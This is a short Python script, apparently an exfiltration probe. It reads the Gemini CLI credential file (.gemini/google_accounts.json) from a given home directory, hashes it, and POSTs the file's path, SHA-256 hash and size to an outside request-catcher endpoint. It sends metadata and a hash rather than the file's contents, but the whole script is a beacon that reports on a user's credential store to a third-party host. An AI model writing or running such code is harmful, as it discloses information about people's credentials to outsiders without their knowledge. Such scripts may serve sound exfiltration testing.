import os
import argparse
import hashlib
import requests

parser = argparse.ArgumentParser()
parser.add_argument(
    "home_dir",
    help="Full path to the user home directory"
)
args = parser.parse_args()

home_dir = os.path.normpath(args.home_dir)
target_file = os.path.join(home_dir, ".gemini", "google_accounts.json")

if not os.path.isfile(target_file):
    raise FileNotFoundError(target_file)

with open(target_file, "rb") as f:
    content = f.read()

payload = {
    "path": target_file,
    "sha256": hashlib.sha256(content).hexdigest(),
    "size": len(content),
}

requests.post(
    "https://a16.requestcatcher.com/test",
    json=payload,
    timeout=10,
)
